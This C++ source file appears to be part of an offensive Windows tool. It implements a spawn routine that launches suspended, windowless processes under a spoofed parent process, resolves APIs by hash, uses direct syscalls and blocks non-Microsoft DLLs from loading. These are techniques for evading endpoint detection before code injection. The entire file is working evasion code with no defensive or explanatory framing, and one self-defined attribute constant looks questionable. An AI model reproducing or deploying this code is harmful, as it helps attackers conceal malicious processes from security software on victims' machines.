#include "ProcSpoof.h"
#include "ApiHash.h"
#include "Syscalls.h"

#include <windows.h>

#include <cstddef>
#include <cstring>
#include <vector>

#ifndef PROC_THREAD_ATTRIBUTE_BLOCKDLLS
#define PROC_THREAD_ATTRIBUTE_BLOCKDLLS 0x20002
#endif

namespace pps {

namespace {

void* k32(const char* n) {
    return api::export_by_hash(API_HASH("kernel32.dll"), API_HASH(n));
}

typedef BOOL (WINAPI* InitializeProcThreadAttributeList_t)(
    void* lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, size_t* lpSize);
typedef BOOL (WINAPI* UpdateProcThreadAttribute_t)(
    void* lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, void* lpValue,
    size_t cbSize, void* lpPreviousValue, size_t* lpReturnSize);
typedef void (WINAPI* DeleteProcThreadAttributeList_t)(void* lpAttributeList);

struct ProcApi {
    InitializeProcThreadAttributeList_t init;
    UpdateProcThreadAttribute_t upd;
    DeleteProcThreadAttributeList_t del;
    BOOL (WINAPI* CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
        LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW,
        LPPROCESS_INFORMATION);
    HANDLE (WINAPI* OpenProcess)(DWORD, BOOL, DWORD);
};

ProcApi resolve() {
    constexpr std::uint32_t k32h = API_HASH("kernel32.dll");
    ProcApi a{};
    a.init = api::resolve<InitializeProcThreadAttributeList_t>(k32h, API_HASH("InitializeProcThreadAttributeList"));
    a.upd = api::resolve<UpdateProcThreadAttribute_t>(k32h, API_HASH("UpdateProcThreadAttribute"));
    a.del = api::resolve<DeleteProcThreadAttributeList_t>(k32h, API_HASH("DeleteProcThreadAttributeList"));
    a.CreateProcessW = api::resolve<decltype(&::CreateProcessW)>(k32h, API_HASH("CreateProcessW"));
    a.OpenProcess = api::resolve<decltype(&::OpenProcess)>(k32h, API_HASH("OpenProcess"));
    return a;
}

} // namespace

SpawnCtx spawn(const std::wstring& cmd, std::uint32_t parent_pid,
               bool block_dlls, bool mitigation) {
    auto a = resolve();
    SpawnCtx out{nullptr, nullptr};
    if (!a.CreateProcessW) return out;

    HANDLE hParent = nullptr;
    if (parent_pid) hParent = a.OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};

    size_t attrSize = 0;
    a.init(nullptr, 1 + block_dlls + mitigation + (hParent ? 1 : 0), 0, &attrSize);
    if (attrSize == 0 || attrSize > 0x1000) {
        if (hParent) syscalls::ScClose(hParent);
        return out;
    }
    std::vector<std::uint8_t> attrBuf(attrSize + sizeof(void*));
    void* attrList = attrBuf.data();
    if (!a.init(attrList, 1 + block_dlls + mitigation + (hParent ? 1 : 0), 0, &attrSize)) {
        if (hParent) syscalls::ScClose(hParent);
        return out;
    }

    DWORD flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW;
    STARTUPINFOEXW six{};
    six.StartupInfo = si;
    six.StartupInfo.cb = sizeof(six);
    six.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrList);

    if (hParent) {
        DWORD_PTR parent = (DWORD_PTR)hParent;
        a.upd(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent, sizeof(parent), nullptr, nullptr);
    }
    if (block_dlls) {
        DWORD block = 1;
        a.upd(attrList, 0, PROC_THREAD_ATTRIBUTE_BLOCKDLLS, &block, sizeof(block), nullptr, nullptr);
    }
    if (mitigation) {
        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        a.upd(attrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), nullptr, nullptr);
    }

    std::wstring mut = cmd;
    a.CreateProcessW(nullptr, mut.data(), nullptr, nullptr, FALSE, flags, nullptr, nullptr,
        reinterpret_cast<LPSTARTUPINFOW>(&six), &pi);
    a.del(attrList);
    if (hParent) syscalls::ScClose(hParent);

    out.hProc = pi.hProcess;
    out.hThread = pi.hThread;
    return out;
}

} // namespace pps
